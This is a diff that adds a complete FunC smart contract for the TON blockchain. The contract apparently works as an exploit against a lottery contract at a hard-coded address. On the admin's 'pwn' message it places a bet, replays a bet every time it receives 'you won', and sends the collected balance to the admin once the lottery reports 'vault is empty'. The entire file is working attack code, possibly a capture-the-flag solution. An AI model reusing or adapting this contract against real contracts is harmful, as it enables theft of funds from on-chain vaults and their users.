@@ -1,0 +1,47 @@
+#include "imports/stdlib.fc";
+
+const admin = "0QAtC3QanP0hv4Egb7WOZgZRDvwhm5sG9Kg35shETymOSzpe"a;
+const lottery = "EQCJZTRepG7F4Xf-LnYtPjgLEFwoXQ6U-qmZoWu9Spcdu8rd"a;
+const gas_cost = 1500000;
+
+() send(slice addr, slice body, int grams) impure inline_ref {
+  ;; int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
+  var msg = begin_cell()
+    .store_uint(0x18, 6)
+    .store_slice(addr)
+    .store_coins(grams)
+    .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 32)
+    .store_slice(body);
+  send_raw_message(msg.end_cell(), SEND_MODE_REGULAR);
+}
+
+() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
+    slice msg = in_msg_full.begin_parse();
+    int flags = msg~load_uint(4);
+    if (flags & 1) {
+        return ();
+    }
+    slice source_address = msg~load_msg_addr();
+    int op = in_msg_body~load_uint(32);
+    if (equal_slices_bits(admin, source_address)) {
+        if (equal_slices_bits(in_msg_body, "pwn")) {
+            int value = msg_value - gas_cost;
+            send(lottery, "pwning first time", value);
+            return ();
+        }
+        if (equal_slices_bits(in_msg_body, "withdraw")) {
+            send(admin, "withdraw completed", my_balance - gas_cost);
+            return ();
+        }
+    }
+    if (equal_slices_bits(lottery, source_address)) {
+        if (equal_slices_bits(in_msg_body, "you won")) {
+            send(lottery, "pwning once more", msg_value - gas_cost);
+            return ();
+        }
+        if (equal_slices_bits(in_msg_body, "vault is empty")) {
+            send(admin, "pwn completed", my_balance - gas_cost);
+            return ();
+        }
+    }
+}
